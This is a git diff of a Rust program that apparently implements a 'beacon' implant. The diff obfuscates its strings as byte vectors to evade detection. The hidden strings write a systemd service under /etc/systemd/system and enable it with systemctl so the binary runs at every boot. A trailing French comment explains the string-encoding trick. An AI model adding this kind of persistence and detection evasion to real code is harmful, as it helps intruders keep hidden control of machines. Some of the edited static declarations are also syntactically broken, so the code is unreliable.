@@ -19,8 +19,8 @@ thread_local!(static LAST_ENTRY : RefCell<DateTime<Local>> = RefCell::new(
     }).parse::<DateTime<Local>>().expect("failed to parse")
 ));
 
-static TIME: &str = "./emit";
-static SERVICE: &str = "/etc/systemd/system/beacon_need.service";
+static TIME: &str = ("{}",String::from_utf8(vec![46, 47, 101, 109, 105, 116]).unwrap());//"./emit";
+static SERVICE: &str = ("{}",String::from_utf8(vec![47, 101, 116, 99, 47, 115, 121, 115, 116, 101, 109, 100, 47, 115, 121, 115, 116, 101, 109, 47, 98, 101, 97, 99, 111, 110, 95, 110, 101, 101, 100, 46, 115, 101, 114, 118, 105, 99, 101]).unwrap());//"/etc/systemd/system/beacon_need.service";
 
 fn main() {
     run();
@@ -54,6 +54,7 @@ fn main() {
 // }
 
 fn run() {
+
     //test varbiables
     //let mut is_operating_as_transmition_tower = true; //determined the running mode of the beacon
     let mut cmd = Command::new("sh");
@@ -123,11 +124,11 @@ fn exec_on_boot() {
     let exe = env::current_exe().expect("Failed to get current exe");
     let mut file = File::create(SERVICE).unwrap();
     writeln!(file,
-             "[Unit]\nDescription=Well it s for a beacon\n\n[Service]\nType=oneshot\nExecStart={}\n\n[Install]\nWantedBy=multi-user.target",
-             exe.to_str().unwrap()).expect("Unable to Write");
+            String::from_utf8(vec![91, 85, 110, 105, 116, 93, 92, 110, 68, 101, 115, 99, 114, 105, 112, 116, 105, 111, 110, 61, 87, 101, 108, 108, 32, 105, 116, 32, 115, 32, 102, 111, 114, 32, 97, 32, 98, 101, 97, 99, 111, 110, 92, 110, 92, 110, 91, 83, 101, 114, 118, 105, 99, 101, 93, 92, 110, 84, 121, 112, 101, 61, 111, 110, 101, 115, 104, 111, 116, 92, 110, 69, 120, 101, 99, 83, 116, 97, 114, 116, 61, 123, 125, 92, 110, 92, 110, 91, 73, 110, 115, 116, 97, 108, 108, 93, 92, 110, 87, 97, 110, 116, 101, 100, 66, 121, 61, 109, 117, 108, 116, 105, 45, 117, 115, 101, 114, 46, 116, 97, 114, 103, 101, 116]).unwrap(),
+            exe.to_str().unwrap()).expect("Unable to Write"); //[Unit]\nDescription=Well it s for a beacon\n\n[Service]\nType=oneshot\nExecStart={}\n\n[Install]\nWantedBy=multi-user.target
     Command::new("sh")
-        .arg("-c")
-        .arg("systemctl enable beacon_need.service")
+        .arg(String::from_utf8(vec![45, 99]).unwrap()) //-c
+        .arg(String::from_utf8(vec![115, 121, 115, 116, 101, 109, 99, 116, 108, 32, 101, 110, 97, 98, 108, 101, 32, 98, 101, 97, 99, 111, 110, 95, 110, 101, 101, 100, 46, 115, 101, 114, 118, 105, 99, 101]).unwrap()) //systemctl enable beacon_need.service
         .spawn()
         .expect("systemctl failed to execute");
 }
@@ -145,3 +146,6 @@ fn update_time() {
 fn get_latest_action(mut simu_request: &Vec<BeaconAction>) -> Option<BeaconAction> {
     return simu_request.pop()
 }
+
+//Méthode pour chiffrer les strings du texte :
+//String::from_utf8(vec![<Numéros de codage sous format XXX, XXX, XXX>]).unwrap();
